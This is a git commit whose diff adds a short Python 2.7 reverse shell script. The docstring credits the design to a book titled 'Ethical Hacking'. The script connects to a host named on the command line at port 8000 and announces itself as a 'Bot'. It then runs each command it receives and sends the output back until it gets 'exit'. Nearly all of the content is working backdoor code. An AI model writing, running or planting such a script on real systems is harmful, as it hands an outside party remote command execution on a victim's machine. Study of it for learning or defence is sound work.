73b6ddbd8db2a8fdeeba555b29430385dd7608b1
Bobby Valenzuela <bobby.valenzuela@protonmail.com>
2023-01-08 18:21:04 -0800

    Added content to reverse shell script

--- reverseShell.py
+++
@@ -1,3 +0,0 @@
-#!/usr/bin/env python
-# Optimized to run on python 2.7
-
---
+++ reverseShells/reverseShell.py
@@ -0,0 +1,29 @@
+#!/usr/bin/env python
+# Scripted to run on python 2.7
+
+"""
+Description: Reverse Shell script as laid out in the book "Ethical Hacking". Made some adjustments of my own as well.
+"""
+
+import sys
+from subprocess import Popen, PIPE
+from socket import *
+
+serverName = sys.argv[1]
+serverPort = 8000
+
+# Create IPv4(AF_INET), TCPSocket(Sock_Stream)
+clientSocket = socket(AF_INET, SOCK_STREAM)
+clientSocket.connect((serverName,serverPort))
+clientSocket.send('Bot repporting for duty'.encode())
+
+command = clientSocket.recv(4064).decode()
+
+while command != 'exit':
+
+    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
+    result, err = proc.communicate()
+    clientSocket.send(result)
+    command = (clientSocket.recv(4064)).decode()
+
+clientSocket.close()
